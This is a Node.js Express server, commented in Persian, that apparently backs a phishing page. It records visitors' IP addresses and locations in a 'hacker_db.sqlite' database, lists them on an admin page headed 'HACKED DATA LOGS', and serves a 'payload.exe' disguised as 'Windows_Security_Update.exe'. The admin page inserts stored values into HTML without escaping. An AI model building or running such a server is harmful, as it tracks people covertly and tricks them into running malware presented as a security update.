const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// تنظیمات دیتابیس
const DB_FILE = 'hacker_db.sqlite';
const db = new sqlite3.Database(DB_FILE);

db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, geo TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)");
});

app.use(express.json()); 

// 1. صفحه اصلی
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// 2. دریافت داده (لاگ)
app.post('/log', (req, res) => {
    const { ip, geo } = req.body;
    db.run("INSERT INTO logs (ip, geo) VALUES (?, ?)", [ip, geo], function(err) {
        if (err) console.error(err);
        res.send('OK');
    });
});

// 3. پنل ادمین
app.get('/admin', (req, res) => {
    db.all("SELECT * FROM logs ORDER BY id DESC", [], (err, rows) => {
        if (err) return res.send("Database Error");
        
        let html = `<html><body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
                    <h1>HACKED DATA LOGS</h1>
                    <table border="1" cellpadding="10" style="border-collapse: collapse; width:100%;">
                    <tr><th>ID</th><th>IP Address</th><th>Location</th><th>Time</th></tr>`;
                    
        if (rows.length === 0) {
            html += "<tr><td colspan='4'>No data yet.</td></tr>";
        } else {
            rows.forEach(row => {
                html += `<tr><td>${row.id}</td><td>${row.ip}</td><td>${row.geo}</td><td>${row.timestamp}</td></tr>`;
            });
        }
        html += "</table></body></html>";
        res.send(html);
    });
});

// 4. دانلود فایل مخرب (Fake Payload)
app.get('/download', (req, res) => {
    // مسیر فایل exe که در پوشه پروژه گذاشتی
    const filePath = path.join(__dirname, 'payload.exe');
    
    // اگر فایل وجود نداشت، یک فایل خالی کوچک بساز تا ارور ندهد
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, "FAKE_PAYLOAD");
    }
    
    res.download(filePath, 'Windows_Security_Update.exe');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
